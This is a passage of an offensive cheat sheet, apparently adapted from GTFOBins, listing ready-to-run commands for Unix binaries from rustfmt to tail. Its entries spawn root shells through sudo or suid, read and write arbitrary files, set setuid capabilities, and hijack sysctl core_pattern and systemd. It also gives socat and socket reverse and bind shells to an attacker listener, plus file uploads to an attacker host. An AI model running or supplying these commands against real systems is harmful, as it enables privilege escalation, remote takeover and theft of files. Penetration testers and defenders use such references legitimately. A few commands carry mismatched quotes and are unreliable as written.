```sh title:"GTFOBins Read Rustfmt File Read (rustfmt file read (sudo / unprivileged)"
rustfmt $file_in
```
<!-- cheat
var file_in
-->

## rustup

### rustup shell

Spawn rustup shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Rustup Shell (rustup shell (sudo / unprivileged)"
mkdir $tmp_dir/bin/
mkdir $tmp_dir/lib/
cp /bin/sh $tmp_dir/bin/rustc
rustup toolchain link x $tmp_dir/
rustup run x rustc
```
<!-- cheat
var tmp_dir
-->

### rustup command

Execute rustup command with the Gtfobins GTFOBins technique.

Execute an arbitrary non-interactive command.

```sh title:"GTFOBins Execute Rustup Command (rustup command (sudo / unprivileged)"
mkdir $tmp_dir/bin/
mkdir $tmp_dir/lib/
echo '$cmd_file' >$tmp_dir/bin/rustc
chmod +x $tmp_dir/bin/rustc
rustup toolchain link x $tmp_dir/
rustup run x rustc
```
<!-- cheat
var cmd_file
var tmp_dir
-->

## rview

Alias of [view](#view). All techniques from `view` apply.

## rvim

Alias of [vim](#vim). All techniques from `vim` apply.

## sash

### sash shell

Spawn sash shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Sash Shell (sash shell (sudo / suid / unprivileged)"
sash
```
<!-- cheat
-->

## scanmem

### scanmem shell

Scan scanmem shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Scan Scanmem Shell (scanmem shell (sudo / suid / unprivileged)"
scanmem
shell /bin/sh
```
<!-- cheat
-->

## scp

### scp shell #1

Spawn scp shell #1 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Scp Shell #1 (scp shell (sudo / suid / unprivileged)"
echo 'exec /bin/sh 0<&2 1>&2' >$tmp_file
chmod +x $tmp_file
scp -S $tmp_file x x:
```
<!-- cheat
var tmp_file
-->

### scp shell #2

Spawn scp shell #2 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Scp Shell #2 (scp shell (sudo / suid / unprivileged)"
scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:
```
<!-- cheat
-->

### scp download

Download scp download with the Gtfobins GTFOBins technique.

Pull a remote file to disk.

```sh title:"GTFOBins Download Scp Download (scp download (sudo / suid / unprivileged)"
scp user@$lhost:$file_in $file_out
```
<!-- cheat
import tun_ip
var file_in
var file_out
-->

### scp upload

Upload scp upload with the Gtfobins GTFOBins technique.

Push a local file to a remote receiver.

```sh title:"GTFOBins Upload Scp Upload (scp upload (sudo / suid / unprivileged)"
scp $file_in user@$lhost:$file_out
```
<!-- cheat
import tun_ip
var file_in
var file_out
-->

## screen

### screen shell

Spawn screen shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Screen Shell (screen shell (sudo / unprivileged)"
screen
```
<!-- cheat
-->

### screen file-write #1

Write screen file write #1 with the Gtfobins GTFOBins technique.

Data is appended to the file and `\n` is converted to `\r\n`.

```sh title:"GTFOBins Write Screen File Write #1 (screen file write (sudo / unprivileged)"
screen -L -Logfile $file_out echo $data
```
<!-- cheat
var data
var file_out
-->

### screen file-write #2

Write screen file write #2 with the Gtfobins GTFOBins technique.

Data is appended to the file and `\n` is converted to `\r\n`.

```sh title:"GTFOBins Write Screen File Write #2 (screen file write (sudo / unprivileged)"
screen -L $file_out echo $data
```
<!-- cheat
var data
var file_out
-->

## script

### script shell

Spawn script shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Script Shell (script shell (sudo / suid / unprivileged)"
script -q /dev/null
```
<!-- cheat
-->

### script file-write

Write script file write with the Gtfobins GTFOBins technique.

The content appears among the log prints.

```sh title:"GTFOBins Write Script File Write (script file write (sudo / suid / unprivileged)"
script -q -c '# $data' $file_out
```
<!-- cheat
var data
var file_out
-->

## scrot

This requires a running X server.

### scrot shell

Spawn scrot shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Scrot Shell (scrot shell (sudo / suid / unprivileged)"
scrot -e /bin/sh
```
<!-- cheat
-->

## sed

### sed shell #1

Spawn sed shell #1 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Sed Shell #1 (sed shell (sudo / suid / unprivileged)"
sed -n '1e exec /bin/sh 1>&0' /etc/hosts
```
<!-- cheat
-->

### sed shell #2

Spawn sed shell #2 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Sed Shell #2 (sed shell (sudo / suid / unprivileged)"
sed e
```
<!-- cheat
-->

### sed file-read

Read sed file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Sed File Read (sed file read (sudo / suid / unprivileged)"
sed '' $file_in
```
<!-- cheat
var file_in
-->

### sed file-write

Write sed file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Sed File Write (sed file write (sudo / suid / unprivileged)"
sed -n '1s/.*/$data/w $file_out' /etc/hosts
```
<!-- cheat
var data
var file_out
-->

## service

### service shell

Spawn service shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Service Shell (service shell (sudo / unprivileged)"
service ../../bin/sh
```
<!-- cheat
-->

## setarch

### setarch shell

Spawn setarch shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Setarch Shell (setarch shell (sudo / suid / unprivileged)"
setarch -3 /bin/sh
```
<!-- cheat
-->

#### setarch shell - suid override
Spawn setarch shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Setarch Shell (setarch shell (suid variant)"
setarch -3 /bin/sh -p
```
<!-- cheat
-->

## setcap

### setcap privilege-escalation

Set setcap privilege escalation with the Gtfobins GTFOBins technique.

This can be used to assign capabilities to executable files.

```sh title:"GTFOBins Set Setcap Privilege Escalation (setcap privilege escalation (sudo / suid)"
setcap cap_setuid+ep $cmd_file
```
<!-- cheat
var cmd_file
-->

## setfacl

### setfacl privilege-escalation

Set setfacl privilege escalation with the Gtfobins GTFOBins technique.

This can be run with elevated privileges to change ownership and then read, write, or execute a file.

```sh title:"GTFOBins Set Setfacl Privilege Escalation (setfacl privilege escalation (sudo / suid)"
setfacl -m u:$(id -un):rwx $file_in
```
<!-- cheat
var file_in
-->

## setlock

### setlock shell

Spawn setlock shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Setlock Shell (setlock shell (sudo / suid / unprivileged)"
setlock - /bin/sh
```
<!-- cheat
-->

#### setlock shell - suid override
Spawn setlock shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Setlock Shell (setlock shell (suid variant)"
setlock - /bin/sh -p
```
<!-- cheat
-->

## sftp

### sftp shell

Spawn sftp shell with the Gtfobins GTFOBins technique.

This still requires a successfull connection to the server.

```sh title:"GTFOBins Spawn Sftp Shell (sftp shell (sudo / suid / unprivileged)"
sftp user@$lhost
!/bin/sh
```
<!-- cheat
import tun_ip
-->

### sftp download

Download sftp download with the Gtfobins GTFOBins technique.

Pull a remote file to disk.

```sh title:"GTFOBins Download Sftp Download (sftp download (sudo / suid / unprivileged)"
sftp user@$lhost
get $file_in $file_out
```
<!-- cheat
import tun_ip
var file_in
var file_out
-->

### sftp upload

Upload sftp upload with the Gtfobins GTFOBins technique.

Push a local file to a remote receiver.

```sh title:"GTFOBins Upload Sftp Upload (sftp upload (sudo / suid / unprivileged)"
sftp user@$lhost
put $file_in $file_out
```
<!-- cheat
import tun_ip
var file_in
var file_out
-->

## sg

### sg shell

Spawn sg shell with the Gtfobins GTFOBins technique.

Commands can be run if the current user's group is specified, therefore no additional permissions are needed.

```sh title:"GTFOBins Spawn Sg Shell (sg shell (sudo / unprivileged)"
sg $(id -ng)
```
<!-- cheat
-->

#### sg shell - sudo override
Spawn sg shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Sg Shell (sg shell (sudo variant)"
sg root
```
<!-- cheat
-->

## shred

### shred file-write

Write shred file write with the Gtfobins GTFOBins technique.

This actually deletes the chosen file.

```sh title:"GTFOBins Write Shred File Write (shred file write (sudo / suid / unprivileged)"
shred -u $file_out
```
<!-- cheat
var file_out
-->

## shuf

### shuf file-read

Read shuf file read with the Gtfobins GTFOBins technique.

The read file content is corrupted by randomizing the order of NUL terminated strings.

```sh title:"GTFOBins Read Shuf File Read (shuf file read (sudo / suid / unprivileged)"
shuf -z $file_in
```
<!-- cheat
var file_in
-->

### shuf file-write

Write shuf file write with the Gtfobins GTFOBins technique.

The written file content is corrupted by adding a newline.

```sh title:"GTFOBins Write Shuf File Write (shuf file write (sudo / suid / unprivileged)"
shuf -e $data -o $file_out
```
<!-- cheat
var data
var file_out
-->

## slsh

### slsh shell

Spawn slsh shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Slsh Shell (slsh shell (sudo / suid / unprivileged)"
slsh -e 'system("/bin/sh")'
```
<!-- cheat
-->

## smbclient

### smbclient shell

Spawn smbclient shell with the Gtfobins GTFOBins technique.

A valid SMB/CIFS server must be available.

```sh title:"GTFOBins Spawn Smbclient Shell (smbclient shell (sudo / unprivileged)"
smbclient '\\host\share'
!/bin/sh
```
<!-- cheat
-->

### smbclient download

Download smbclient download with the Gtfobins GTFOBins technique.

Pull a remote file to disk.

```sh title:"GTFOBins Download Smbclient Download (smbclient download (sudo / unprivileged)"
smbclient '\\$lhost\share' -c 'get $file_in $file_out'
```
<!-- cheat
import tun_ip
var file_in
var file_out
-->

### smbclient upload

Upload smbclient upload with the Gtfobins GTFOBins technique.

Push a local file to a remote receiver.

```sh title:"GTFOBins Upload Smbclient Upload (smbclient upload (sudo / unprivileged)"
smbclient '\\$lhost\share' -c 'put $file_in $file_out'
```
<!-- cheat
import tun_ip
var file_in
var file_out
-->

## snap

### snap command

Execute snap command with the Gtfobins GTFOBins technique.

Generate the Snap package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.  ``` mkdir -p meta/hooks echo -e '#!/bin/sh\n$cmd_file; false' >meta/hooks/install chmod +x meta/hooks/install fpm -n xxxx -s dir -t snap -a all meta ```

```sh title:"GTFOBins Execute Snap Command (snap command (sudo)"
snap install xxxx_1.0_all.snap --dangerous --devmode
```
<!-- cheat
-->

## socat

### socat shell

Read socat shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Read Socat Shell (socat shell (sudo / suid / unprivileged)"
socat - exec:/bin/sh,pty,ctty,raw,echo=0
```
<!-- cheat
-->

#### socat shell - suid override
Read socat shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Read Socat Shell (socat shell (suid variant)"
socat - 'exec:/bin/sh -p,pty,ctty,raw,echo=0'
```
<!-- cheat
-->

### socat reverse-shell

Read socat reverse shell with the Gtfobins GTFOBins technique.

Connect back to an attacker-controlled listener.

```sh title:"GTFOBins Read Socat Reverse Shell (socat reverse shell (sudo / suid / unprivileged)"
socat tcp-connect:$lhost:$lport exec:/bin/sh,pty,stderr,setsid,sigint,sane
```
<!-- cheat
import tun_ip
import lports
-->

#### socat reverse-shell - suid override
Read socat reverse shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Read Socat Reverse Shell (socat reverse shell (suid variant)"
socat tcp-connect:$lhost:$lport 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'
```
<!-- cheat
import tun_ip
import lports
-->

### socat bind-shell

Read socat bind shell with the Gtfobins GTFOBins technique.

Bind a shell to a local port for the attacker to connect to.

```sh title:"GTFOBins Read Socat Bind Shell (socat bind shell (sudo / suid / unprivileged)"
socat tcp-listen:$lport,reuseaddr,fork exec:/bin/sh,pty,stderr,setsid,sigint,sane
```
<!-- cheat
import lports
-->

#### socat bind-shell - suid override
Read socat bind shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Read Socat Bind Shell (socat bind shell (suid variant)"
socat tcp-listen:$lport,reuseaddr,fork 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'
```
<!-- cheat
import lports
-->

### socat file-read

Read socat file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Socat File Read (socat file read (sudo / suid / unprivileged)"
socat -u file:$file_in -
```
<!-- cheat
var file_in
-->

### socat file-write

Read socat file write with the Gtfobins GTFOBins technique.

The `echo` command is actually used.

```sh title:"GTFOBins Read Socat File Write (socat file write (sudo / suid / unprivileged)"
socat -u 'exec:echo $data' open:$file_out,creat
```
<!-- cheat
var data
var file_out
-->

### socat download

Download socat download with the Gtfobins GTFOBins technique.

Pull a remote file to disk.

```sh title:"GTFOBins Download Socat Download (socat download (sudo / suid / unprivileged)"
socat -u tcp-connect:$lhost:$lport open:$file_out,creat
```
<!-- cheat
import tun_ip
import lports
var file_out
-->

### socat upload

Upload socat upload with the Gtfobins GTFOBins technique.

Push a local file to a remote receiver.

```sh title:"GTFOBins Upload Socat Upload (socat upload (sudo / suid / unprivileged)"
socat -u file:$file_in tcp-connect:$lhost:$lport
```
<!-- cheat
import tun_ip
import lports
var file_in
-->

## socket

### socket reverse-shell

Start socket reverse shell with the Gtfobins GTFOBins technique.

Connect back to an attacker-controlled listener.

```sh title:"GTFOBins Start Socket Reverse Shell (socket reverse shell (sudo / suid / unprivileged)"
socket -qvp '/bin/sh -i' $lhost $lport
```
<!-- cheat
import tun_ip
import lports
-->

### socket bind-shell

Start socket bind shell with the Gtfobins GTFOBins technique.

Bind a shell to a local port for the attacker to connect to.

```sh title:"GTFOBins Start Socket Bind Shell (socket bind shell (sudo / suid / unprivileged)"
socket -svp '/bin/sh -i' $lport
```
<!-- cheat
import lports
-->

## soelim

### soelim file-read

Read soelim file read with the Gtfobins GTFOBins technique.

The content is actually parsed and corrupted by the command.

```sh title:"GTFOBins Read Soelim File Read (soelim file read (sudo / suid / unprivileged)"
soelim $file_in
```
<!-- cheat
var file_in
-->

## softlimit

### softlimit shell

Spawn softlimit shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Softlimit Shell (softlimit shell (sudo / suid / unprivileged)"
softlimit /bin/sh
```
<!-- cheat
-->

#### softlimit shell - suid override
Spawn softlimit shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Softlimit Shell (softlimit shell (suid variant)"
softlimit /bin/sh -p
```
<!-- cheat
-->

## sort

### sort file-read

Read sort file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Sort File Read (sort file read (sudo / suid / unprivileged)"
sort -m $file_in
```
<!-- cheat
var file_in
-->

### sort file-write

Write sort file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Sort File Write (sort file write (sudo / suid / unprivileged)"
echo $data | sort -m -o $file_out
```
<!-- cheat
var data
var file_out
-->

## split

### split shell

Spawn split shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Split Shell (split shell (sudo / suid / unprivileged)"
split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts
```
<!-- cheat
-->

### split file-read

Read split file read with the Gtfobins GTFOBins technique.

This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.

```sh title:"GTFOBins Read Split File Read (split file read (sudo / suid / unprivileged)"
split -b 999 --additional-suffix suffix $file_in prefix
cat prefixaasuffix
```
<!-- cheat
var file_in
-->

### split file-write

Write split file write with the Gtfobins GTFOBins technique.

This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.

```sh title:"GTFOBins Write Split File Write (split file write (sudo / suid / unprivileged)"
split -b 999 --additional-suffix suffix $file_in prefix
```
<!-- cheat
var file_in
-->

## sqlite3

### sqlite3 shell

Spawn sqlite3 shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Sqlite3 Shell (sqlite3 shell (sudo / suid / unprivileged)"
sqlite3 /dev/null '.shell /bin/sh'
```
<!-- cheat
-->

### sqlite3 file-read

Read sqlite3 file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Sqlite3 File Read (sqlite3 file read (sudo / suid / unprivileged)"
sqlite3 <<EOF
CREATE TABLE x(x TEXT);
.import $file_in x
SELECT * FROM x;
EOF
```
<!-- cheat
var file_in
-->

### sqlite3 file-write

Write sqlite3 file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Sqlite3 File Write (sqlite3 file write (sudo / suid / unprivileged)"
sqlite3 /dev/null -cmd '.output $file_out' 'select "$data";'
```
<!-- cheat
var data
var file_out
-->

## sqlmap

### sqlmap inherit (inherits from python)

Run sqlmap inherit (inherits from python) with the Gtfobins GTFOBins technique.

This allows to run Python code (`...`).

```sh title:"GTFOBins Run Sqlmap Inherit (inherits from Python) (sqlmap inherit from python (sudo / unprivileged)"
sqlmap -u 127.0.0.1 --eval='...'
```
<!-- cheat
-->

## ss

### ss file-read

Read ss file read with the Gtfobins GTFOBins technique.

The file content is actually parsed so only a part of the first line is returned as a part of an error message.

```sh title:"GTFOBins Read Ss File Read (ss file read (sudo / suid / unprivileged)"
ss -a -F $file_in
```
<!-- cheat
var file_in
-->

## ssh

### ssh shell #1

Spawn ssh shell #1 with the Gtfobins GTFOBins technique.

Reconnecting may help bypassing restricted shells.

```sh title:"GTFOBins Spawn Ssh Shell #1 (ssh shell (sudo / suid / unprivileged)"
ssh localhost /bin/sh
```
<!-- cheat
-->

### ssh shell #2

Spawn ssh shell #2 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Ssh Shell #2 (ssh shell (sudo / unprivileged)"
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
<!-- cheat
-->

### ssh shell #3

Spawn ssh shell #3 with the Gtfobins GTFOBins technique.

Spawn the shell on the client, but still requires a successful remote connection.

```sh title:"GTFOBins Spawn Ssh Shell #3 (ssh shell (sudo / unprivileged)"
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
```
<!-- cheat
-->

### ssh file-read

Read ssh file read with the Gtfobins GTFOBins technique.

The read file content is corrupted by error prints.

```sh title:"GTFOBins Read Ssh File Read (ssh file read (sudo / suid / unprivileged)"
ssh -F $file_in x
```
<!-- cheat
var file_in
-->

### ssh download

Download ssh download with the Gtfobins GTFOBins technique.

Pull a remote file to disk.

```sh title:"GTFOBins Download Ssh Download (ssh download (sudo / suid / unprivileged)"
ssh user@$lhost 'cat $file_in"
```
<!-- cheat
import tun_ip
var file_in
-->

### ssh upload

Upload ssh upload with the Gtfobins GTFOBins technique.

Push a local file to a remote receiver.

```sh title:"GTFOBins Upload Ssh Upload (ssh upload (sudo / suid / unprivileged)"
echo $data | ssh user@$lhost 'cat >$file_out"
```
<!-- cheat
import tun_ip
var data
var file_out
-->

## ssh-agent

### ssh-agent shell

Spawn ssh agent shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Ssh Agent Shell (ssh-agent shell (sudo / suid / unprivileged)"
ssh-agent /bin/sh
```
<!-- cheat
-->

#### ssh-agent shell - suid override
Spawn ssh agent shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Ssh Agent Shell (ssh-agent shell (suid variant)"
ssh-agent /bin/sh -p
```
<!-- cheat
-->

## ssh-copy-id

### ssh-copy-id file-read

Read ssh copy id file read with the Gtfobins GTFOBins technique.

The input file must have the `.pub` file extension. The file will be copied to `~/.ssh/authorized_keys`, otherwise the `-t $file_out` option can be used.

```sh title:"GTFOBins Read Ssh Copy Id File Read (ssh-copy-id file read (sudo / unprivileged)"
ssh-copy-id -f -i $file_in.pub user@$lhost
```
<!-- cheat
import tun_ip
var file_in
-->

### ssh-copy-id file-write

Write ssh copy id file write with the Gtfobins GTFOBins technique.

The input file must have the `.pub` file extension.

```sh title:"GTFOBins Write Ssh Copy Id File Write (ssh-copy-id file write (sudo / unprivileged)"
ssh-copy-id -f -i $file_in.pub -t $file_out user@host
```
<!-- cheat
var file_in
var file_out
-->

## ssh-keygen

### ssh-keygen library-load

Run ssh keygen library load with the Gtfobins GTFOBins technique.

The shared library must contain the `void C_GetFunctionList() {}` function.

```sh title:"GTFOBins Run Ssh Keygen Library Load (ssh-keygen library load (sudo / suid / unprivileged)"
ssh-keygen -D $lib
```
<!-- cheat
var lib
-->

## ssh-keyscan

### ssh-keyscan file-read

Read ssh keyscan file read with the Gtfobins GTFOBins technique.

The file content is actually parsed so only a part of each line is returned as a part of an error message.

```sh title:"GTFOBins Read Ssh Keyscan File Read (ssh-keyscan file read (sudo / suid / unprivileged)"
ssh-keyscan -f $file_in
```
<!-- cheat
var file_in
-->

## sshfs

### sshfs shell

Spawn sshfs shell with the Gtfobins GTFOBins technique.

The mount dir must be writable by the invoking user.

```sh title:"GTFOBins Spawn Sshfs Shell (sshfs shell (sudo / unprivileged)"
echo -e '/bin/sh </dev/tty >/dev/tty 2>/dev/tty' >$tmp_file
chmod +x $tmp_file
sshfs -o ssh_command=$tmp_file x: $dir/
```
<!-- cheat
var dir
var tmp_file
-->

### sshfs command

Execute sshfs command with the Gtfobins GTFOBins technique.

Execute an arbitrary non-interactive command.

```sh title:"GTFOBins Execute Sshfs Command (sshfs command (sudo / unprivileged)"
sshfs -o ssh_command=$cmd_file x: $dir/
```
<!-- cheat
var cmd_file
var dir
-->

### sshfs download

Download sshfs download with the Gtfobins GTFOBins technique.

Pull a remote file to disk.

```sh title:"GTFOBins Download Sshfs Download (sshfs download (unprivileged)"
sshfs user@$lhost:/ $dir/
cp $dir$file_in $file_out
```
<!-- cheat
import tun_ip
var dir
var file_in
var file_out
-->

### sshfs upload

Upload sshfs upload with the Gtfobins GTFOBins technique.

Push a local file to a remote receiver.

```sh title:"GTFOBins Upload Sshfs Upload (sshfs upload (unprivileged)"
sshfs user@$lhost:/ $dir/
cp $file_in $dir/
```
<!-- cheat
import tun_ip
var dir
var file_in
-->

## sshpass

### sshpass shell

Spawn sshpass shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Sshpass Shell (sshpass shell (sudo / suid / unprivileged)"
sshpass /bin/sh
```
<!-- cheat
-->

#### sshpass shell - suid override
Spawn sshpass shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Sshpass Shell (sshpass shell (suid variant)"
sshpass /bin/sh -p
```
<!-- cheat
-->

## sshuttle

### sshuttle shell

Spawn sshuttle shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Sshuttle Shell (sshuttle shell (sudo)"
sudo sshuttle -r x --ssh-cmd '/bin/sh -c "/bin/sh 0<&2 1>&2"' localhost
```
<!-- cheat
-->

## start-stop-daemon

### start-stop-daemon shell

Start stop daemon shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Start Stop Daemon Shell (start-stop-daemon shell (sudo / suid / unprivileged)"
start-stop-daemon -S -x /bin/sh
```
<!-- cheat
-->

#### start-stop-daemon shell - suid override
Start stop daemon shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Start Stop Daemon Shell (start-stop-daemon shell (suid variant)"
start-stop-daemon -S -x /bin/sh -- -p
```
<!-- cheat
-->

## stdbuf

### stdbuf shell

Spawn stdbuf shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Stdbuf Shell (stdbuf shell (sudo / suid / unprivileged)"
stdbuf -i0 /bin/sh
```
<!-- cheat
-->

#### stdbuf shell - suid override
Spawn stdbuf shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Stdbuf Shell (stdbuf shell (suid variant)"
stdbuf -i0 /bin/sh -p
```
<!-- cheat
-->

## strace

### strace shell

Spawn strace shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Strace Shell (strace shell (sudo / suid / unprivileged)"
strace -o /dev/null /bin/sh
```
<!-- cheat
-->

#### strace shell - suid override
Spawn strace shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Strace Shell (strace shell (suid variant)"
strace -o /dev/null /bin/sh -p
```
<!-- cheat
-->

### strace file-write

Write strace file write with the Gtfobins GTFOBins technique.

The data to be written appears amid the syscall log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough instead of `999`. More generally, any binary that executes whatever syscall passing arbitrary data can be used in place of `strace - $data`.

```sh title:"GTFOBins Write Strace File Write (strace file write (sudo / unprivileged)"
strace -s 999 -o $file_out strace - $data
```
<!-- cheat
var data
var file_out
-->

## strings

### strings file-read

Read strings file read with the Gtfobins GTFOBins technique.

This only returns ASCII strings.

```sh title:"GTFOBins Read Strings File Read (strings file read (sudo / suid / unprivileged)"
strings $file_in
```
<!-- cheat
var file_in
-->

## su

### su shell

Spawn su shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Su Shell (su shell (sudo)"
su -c /bin/sh
```
<!-- cheat
-->

## sudo

### sudo shell

Spawn sudo shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Sudo Shell (sudo shell (sudo)"
sudo /bin/sh
```
<!-- cheat
-->

## sysctl

### sysctl command

Execute sysctl command with the Gtfobins GTFOBins technique.

The command is executed by `root` in the background when a core dump occurs.  To trigger a core dump, send the `SIGQUIT` signal to a process, for example:  ``` sleep infinity & kill -QUIT $! ```

```sh title:"GTFOBins Execute Sysctl Command (sysctl command (sudo / suid)"
sysctl 'kernel.core_pattern=|$cmd_file'
```
<!-- cheat
var cmd_file
-->

### sysctl file-read

Read sysctl file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Sysctl File Read (sysctl file read (sudo / suid / unprivileged)"
sysctl -n "/../.$file_in"
```
<!-- cheat
var file_in
-->

## systemctl

### systemctl shell #1

Spawn systemctl shell #1 with the Gtfobins GTFOBins technique.

It might happen that the service is not started with `--now`, in such cases it might be necessary to manually start it.

```sh title:"GTFOBins Spawn Systemctl Shell #1 (systemctl shell (sudo / suid)"
echo '[Service]
Type=oneshot
ExecStart=$cmd_file
[Install]
WantedBy=multi-user.target' >$tmp_file
systemctl link $tmp_file
systemctl enable --now $tmp_file
```
<!-- cheat
var cmd_file
var tmp_file
-->

### systemctl shell #2

Spawn systemctl shell #2 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Systemctl Shell #2 (systemctl shell (sudo)"
echo /bin/sh >$tmp_file
chmod +x $tmp_file
SYSTEMD_EDITOR=$tmp_file systemctl edit basic.target
```
<!-- cheat
var tmp_file
-->

### systemctl inherit (inherits from less)

Run systemctl inherit (inherits from less) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Systemctl Inherit (inherits from Less) (systemctl inherit from less (sudo / suid / unprivileged)"
systemctl
```
<!-- cheat
-->

## systemd-resolve

### systemd-resolve inherit (inherits from less)

Run systemd resolve inherit (inherits from less) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Systemd Resolve Inherit (inherits from Less) (systemd-resolve inherit from less (sudo)"
systemd-resolve --status
```
<!-- cheat
-->

## systemd-run

### systemd-run shell #1

Run systemd run shell #1 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Run Systemd Run Shell #1 (systemd-run shell (sudo)"
systemd-run -S
```
<!-- cheat
-->

### systemd-run shell #2

Run systemd run shell #2 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Run Systemd Run Shell #2 (systemd-run shell (sudo)"
systemd-run -t /bin/sh
```
<!-- cheat
-->

### systemd-run command

Run systemd run command with the Gtfobins GTFOBins technique.

Execute an arbitrary non-interactive command.

```sh title:"GTFOBins Run Systemd Run Command (systemd-run command (sudo)"
systemd-run $cmd_file
```
<!-- cheat
var cmd_file
-->

## tac

### tac file-read

Read tac file read with the Gtfobins GTFOBins technique.

Make sure that `RANDOM` does not appear into the file to read otherwise the content of the file is corrupted by reversing the order of `RANDOM`-separated chunks.

```sh title:"GTFOBins Read Tac File Read (tac file read (sudo / suid / unprivileged)"
tac -s 'RANDOM' $file_in
```
<!-- cheat
var file_in
-->

## tail

### tail file-read

Read tail file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Tail File Read (tail file read (sudo / suid / unprivileged)"
tail -c+0 $file_in
```
<!-- cheat
var file_in
-->

## tailscale

### tailscale upload

